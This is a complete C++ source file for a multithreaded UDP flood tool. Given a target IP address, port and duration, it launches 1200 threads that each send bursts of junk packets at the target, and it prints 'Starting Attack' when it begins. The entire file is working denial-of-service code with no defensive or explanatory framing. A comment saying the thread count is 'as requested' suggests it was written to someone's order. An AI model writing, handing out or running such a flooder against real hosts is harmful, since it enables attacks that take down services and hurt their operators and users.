#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

void attack(string ip, int port, int duration, int burst) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr);

    char data[1024];
    memset(data, 'A', sizeof(data));

    auto end_time = chrono::steady_clock::now() + chrono::seconds(duration);

    while (chrono::steady_clock::now() < end_time) {
        for (int i = 0; i < burst; i++) {
            sendto(sock, data, sizeof(data), 0, (sockaddr*)&serverAddr, sizeof(serverAddr));
        }
    }
    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cout << "Usage: " << argv[0] << " <IP> <Port> <Time_in_seconds>\n";
        return 1;
    }

    string ip = argv[1];
    int port = atoi(argv[2]);
    int time_sec = atoi(argv[3]);
    int threads = 1200; // 1200 threads as requested
    int burst = 677;    // Burst packets per loop

    cout << "Starting Attack on " << ip << ":" << port << " for " << time_sec << " seconds...\n";

    vector<thread> th;
    for (int i = 0; i < threads; i++) {
        th.emplace_back(attack, ip, port, time_sec, burst);
    }

    for (auto& t : th) {
        t.join();
    }

    cout << "Attack completed.\n";
    return 0;
}
